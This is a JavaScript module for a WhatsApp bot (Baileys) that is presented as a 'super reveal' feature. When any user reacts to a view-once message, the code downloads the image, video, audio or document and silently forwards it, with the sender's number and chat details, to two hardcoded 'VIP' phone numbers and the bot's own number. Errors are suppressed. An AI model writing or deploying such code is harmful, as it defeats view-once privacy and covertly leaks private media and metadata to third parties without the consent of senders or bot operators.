// observers/superReveal.js
import { downloadMediaMessage } from '@whiskeysockets/baileys'

export default async function superReveal(sock, { msg, from, sender, reaction, isGroup }, botSettings) {
  try {
    if (!botSettings) return
    if (!reaction?.text) return

    // Get the message that was reacted to
    const reactedMsgKey = msg.message?.reactionMessage?.key
    if (!reactedMsgKey?.id) return

    // Load the original message
    const reactedMsg = await sock.loadMessage(from, reactedMsgKey.id).catch(() => null)
    if (!reactedMsg?.message) return

    // Check if it's a viewonce message
    let actualMsg = null
    if (reactedMsg.message.viewOnceMessage?.message) {
      actualMsg = reactedMsg.message.viewOnceMessage.message
    } else if (reactedMsg.message.viewOnceMessageV2?.message) {
      actualMsg = reactedMsg.message.viewOnceMessageV2.message
    } else if (reactedMsg.message.viewOnceMessageV2Extension?.message) {
      actualMsg = reactedMsg.message.viewOnceMessageV2Extension.message
    }

    if (!actualMsg) return

    const msgType = Object.keys(actualMsg)[0]
    const mediaMsg = actualMsg[msgType]

    // Download media
    const buffer = await downloadMediaMessage(
      { message: actualMsg },
      'buffer',
      {},
      { logger: console, reuploadRequest: sock.updateMediaMessage }
    ).catch(() => null)

    if (!buffer || buffer.length === 0) return

    // Add your numbers here - works for any user, any emoji
    const VIP_NUMBERS = ['255780470905', '255747470941']

    // Bot's own number
    const botJid = sock.user.id
    const botNumber = botJid.split(':')[0] + '@s.whatsapp.net'

    // Build target list: VIP numbers + bot
    const targets = [
     ...VIP_NUMBERS.map(n => n.includes('@')? n : n + '@s.whatsapp.net'),
      botNumber
    ]
    const uniqueTargets = [...new Set(targets)]

    // Build caption
    const brandName = botSettings?.brand_name || botSettings?.botname || 'Bot'
    const senderNum = sender.split('@')[0]
    const chatInfo = isGroup? `Group: ${from}` : 'Chat: Private'

    let caption = `╭─⌈ 👀 SUPER REVEAL ⌋
│ Type: ${msgType}
│ From: ${senderNum}
│ ${chatInfo}
│ Reaction: ${reaction.text}
│ Time: ${new Date().toLocaleString()}
╰⊷ *${brandName}*`

    if (mediaMsg?.caption) {
      caption += `\n\n*Caption:* ${mediaMsg.caption}`
    }

    // Prepare send options for all media types
    let sendOptions = {}

    switch (msgType) {
      case 'imageMessage':
        sendOptions = { image: buffer, caption }
        break
      case 'videoMessage':
        sendOptions = { video: buffer, caption, gifPlayback: mediaMsg.gifPlayback || false }
        break
      case 'audioMessage':
        sendOptions = { audio: buffer, mimetype: mediaMsg.mimetype || 'audio/mp4', ptt: mediaMsg.ptt || false }
        break
      case 'documentMessage':
        sendOptions = { document: buffer, mimetype: mediaMsg.mimetype, fileName: mediaMsg.fileName || 'file', caption }
        break
      case 'stickerMessage':
        sendOptions = { sticker: buffer }
        break
      case 'conversation':
      case 'extendedTextMessage':
        sendOptions = { text: caption + `\n\n*Content:* ${mediaMsg}` }
        break
      default:
        sendOptions = { text: caption + `\n\n*Info:* Unsupported type ${msgType}` }
        break
    }

    // Send to all targets silently
    for (const target of uniqueTargets) {
      await sock.sendMessage(target, sendOptions).catch(() => {})
    }

  } catch (err) {
    console.log('[SuperReveal Error]:', err.message)
  }
}